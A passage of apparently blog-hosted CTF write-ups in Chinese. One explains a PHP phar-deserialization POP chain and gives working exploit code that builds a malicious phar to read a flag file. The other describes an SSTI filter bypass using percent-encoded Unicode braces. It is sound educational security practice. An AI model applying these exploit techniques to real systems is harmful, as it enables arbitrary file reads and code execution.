class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>同时还拥有一个f1ag.php</p>
<p>直接访问的话会不允许，在show类当中放出了提示，pahr://phar.jpg</p>
<p> 查找POP链的过程是这样的：</p>
<p>Test的$text = base64_encode(file_get_contents($value));作为我们的终极目标</p>
<p>我们查看$value是从哪里传来的，发现一行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = <span class="keyword">$this</span>-&gt;params[$key];</span><br></pre></td></tr></table></figure>

<p>之后查看，发现$key通过__get进行传导</p>
<p>于是构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>回到上面看，因为之前有echo，通过echo查找tostring</p>
<p>于是对source进行控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br></pre></td></tr></table></figure>

<p>对A进行反序列化即可。</p>
<h2 id="1-2-open-basedir"><a href="#1-2-open-basedir" class="headerlink" title="1.2 open_basedir"></a>1.2 open_basedir</h2><p>该函数是php用于基于x目录允许，利用该函数，PHP可以限制用户的读取文件范围，这也就很好的解释了为什么我们只能读取到../../index.php的内容，而无法读取到根目录下flag.txt的文件了</p>
<h1 id="2-做题思路"><a href="#2-做题思路" class="headerlink" title="2.做题思路"></a>2.做题思路</h1><h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>这道题允许下载文件，上传文件和删除文件，我们下载文件的时候可以任意修改文件名（但是由于open_basedir的限制，我们没法办法读取到flag</p>
<p>故利用如下方式能够找到class.php,index.php,download.php,delete.php的内容</p>
<p><img src="image-20201029140816514.png" alt="image-20201029140816514"></p>
<h2 id="2-构造phar反序列化"><a href="#2-构造phar反序列化" class="headerlink" title="2.构造phar反序列化"></a>2.构造phar反序列化</h2><p>根据前面的知识，我们知道我们可以利用phar生成文件，构造pop链读取文件，问题就在于如何构造pop了，我们在这道题很明显要找到的函数就是file_get_contents，能找到File类下的close()类会使用，于是查找全文当中，看看有没有魔术方法能够使用到close类：</p>
<p>最终在User类中查找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 中间略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>于是第一次我尝试如此构造文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果在本地fuzz的时候就发现这样子就压根没回显啊。后来才知道必须输出一下才能看见内容。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是就卡住了，上下再审计代码，找一个echo函数，发现恰好就在FileList当中。。：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $table = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($func) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;  <span class="comment">//这句是全局的核心</span></span><br><span class="line">            $table .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($value) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities($filename) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br></pre></td></tr></table></figure>

<p>想办法，能够控制result，发现题目也正好给出了call这个魔术方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>自己看了一些，这个其实就是一个手写的回调函数嘛。</p>
<p>于是尝试思考，我们可以通过FileList出发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">        $files = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>($files);</span><br><span class="line">        $filenames =<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先new一个User类出来，并将db指向FileList，之后类会被销毁，将会调用FileList当中的call方法，call方法需要我们指定参数名和filename，所以在__construct中进行修改,最终调试得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line"><span class="comment">//        $this-&gt;results = array();</span></span><br><span class="line">        $file-&gt;filename = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        var_dump($file);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line"><span class="comment">//            var_dump( $file-&gt;$func());</span></span><br><span class="line">            <span class="comment">//将result设置成test.txt当中的内容</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//销毁的时候就会被输出了！</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table = <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .=  htmlentities($value);</span><br><span class="line">            &#125;</span><br><span class="line">            $table .=   htmlentities($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调试成功之后构造exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line"><span class="comment">//        $this-&gt;results = array();</span></span><br><span class="line">        $file-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">&quot;5.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;5.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub;</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest  //如果我们是要写phar🐎就用下面的，不然就用上面的setMeatadata</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后用burp上传，删除的时候读取文件即可：</p>
<p><img src="mage-20201029161114167.png" alt="image-20201029161114167"></p>
]]></content>
  </entry>
  <entry>
    <title>太湖杯easyweb</title>
    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
    <content><![CDATA[<p>感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的</p>
<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>这道题的难点主要是过滤掉了花括号，和双引号等。</p>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图：</p>
<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
<p>于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>

<p>其中这一行</p>
<table>
<thead>
<tr>
<th>UTF-8 Encoding:</th>
<th><code>0xEF 0xB9 0x9C</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>我们将0x修改为百分号即可</p>
<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
<p>之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了</p>
<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>事后发现其实还可以利用这种方式进行命令执行：</p>
<p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
]]></content>
  </entry>
</search>
